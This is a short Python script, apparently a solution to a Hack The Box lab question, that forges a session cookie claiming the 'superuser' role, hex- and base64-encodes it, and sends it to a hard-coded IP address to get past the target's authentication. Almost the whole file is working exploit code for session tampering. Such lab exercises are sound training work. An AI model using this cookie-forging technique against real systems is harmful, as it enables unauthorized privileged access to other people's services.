import requests
import time
import base64
import binascii

timestamp = int(time.time())

cookie = "user:htbuser;role:superuser;time:{}".format(timestamp)
sessid = base64.b64encode(cookie.encode().hex().encode())
#print(cookie.encode().hex().encode())
headers = {
	"Cookie":"SESSIONID={}".format(sessid.decode())
}
#print(headers)

url = "http://188.166.173.208:31544/question1/"

r = requests.get(url,headers=headers)
print(r.text)

